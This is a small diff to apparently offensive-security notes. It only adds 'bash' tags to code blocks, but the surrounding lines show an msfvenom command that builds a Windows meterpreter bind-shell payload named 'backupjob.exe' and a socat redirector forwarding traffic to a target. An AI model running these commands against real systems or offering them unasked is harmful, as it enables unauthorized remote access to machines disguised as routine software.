@@ -4,7 +4,7 @@
 ---
 ## Payload Generation
 
-```
+```bash
 msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
 ```
 
@@ -13,7 +13,7 @@ Generate a bind shell payload for the Windows target. `-p` payload, `-f` output 
 ---
 ## Socat Redirector
 
-```
+```bash
 socat TCP4-LISTEN:8080,fork TCP4:<target>:8443
 ```
 
